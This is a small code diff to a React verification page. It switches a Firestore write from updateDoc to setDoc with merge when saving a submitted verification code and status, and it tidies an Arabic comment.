@@ -1,7 +1,7 @@
 import { useState, useEffect, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { AlertCircle, CheckCircle2, Loader2, Headphones, Clock } from 'lucide-react';
-import { doc, updateDoc, onSnapshot } from 'firebase/firestore';
+import { doc, setDoc, onSnapshot } from 'firebase/firestore';
 import { db as dbInstance } from '@/lib/firebase-config';
 import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';
 
@@ -164,13 +164,13 @@ export default function VerifyPage() {
         throw new Error('معرف المستخدم غير موجود');
       }
 
-      // حفظ الرمز المرسل وتغيير الحالة
+      // حفظ الرمز المرسل وتغيير الحالة (استخدام setDoc مع merge لتحديث المستند الموجود)
       const registrationRef = doc(getDb(), 'registrations', userId);
-      await updateDoc(registrationRef, {
+      await setDoc(registrationRef, {
         verification_code: fullCode,
         verification_submitted_at: new Date().toISOString(),
-        status: 'pending_verification' // حالة等待 الموافقة
-      });
+        status: 'pending_verification'
+      }, { merge: true });
       
       // الانتقال لصفحة الانتظار
       setSubmitted(true);
